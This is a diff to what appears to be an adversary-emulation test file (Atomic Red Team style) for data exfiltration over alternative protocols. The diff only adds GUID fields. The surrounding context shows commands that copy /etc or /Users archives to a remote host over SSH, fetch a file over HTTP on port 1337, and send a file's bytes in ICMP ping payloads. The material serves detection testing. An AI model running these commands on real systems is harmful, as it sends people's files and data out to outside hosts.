@@ -4,6 +4,7 @@ display_name: Exfiltration Over Alternative Protocol
 
 atomic_tests:
 - name: Exfiltration Over Alternative Protocol - SSH
+  auto_generated_guid: 488a0854-54b5-46c5-b8ed-479779ea6c9b
   description: |
     Input a domain and test Exfiltration over SSH
 
@@ -28,6 +29,7 @@ atomic_tests:
       ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz
 
 - name: Exfiltration Over Alternative Protocol - SSH
+  auto_generated_guid: 519bbdc3-26f1-4d0f-9af3-771118a6dd1f
   description: |
     Input a domain and test Exfiltration over SSH
 
@@ -60,6 +62,7 @@ atomic_tests:
       tar czpf - /Users/* | openssl des3 -salt -pass #{password} | ssh #{user_name}@#{domain} 'cat > /Users.tar.gz.enc'
 
 - name: Exfiltration Over Alternative Protocol - HTTP
+  auto_generated_guid: 4d99db7f-e4c3-4b2a-817c-4091da56df29
   description: |
     A firewall rule (iptables or firewalld) will be needed to allow exfiltration on port 1337.
 
@@ -87,6 +90,7 @@ atomic_tests:
           wget http://VICTIM_IP:1337/victim-file.txt
 
 - name: Exfiltration Over Alternative Protocol - ICMP
+  auto_generated_guid: 529f20d6-b2bf-4974-b23c-e41964e3994a
   description: |
     Exfiltration of specified file over ICMP protocol.
 
@@ -112,6 +116,7 @@ atomic_tests:
       $ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path #{input_file} -Encoding Byte -ReadCount 1024) { $ping.Send("#{ip_address}", 1500, $Data) }
 
 - name: Exfiltration Over Alternative Protocol - DNS
+  auto_generated_guid: 0f8af4e9-fa01-4e3c-bf45-8311a7004c5c
   description: |
     Exfiltration of specified file over DNS protocol.
   supported_platforms:
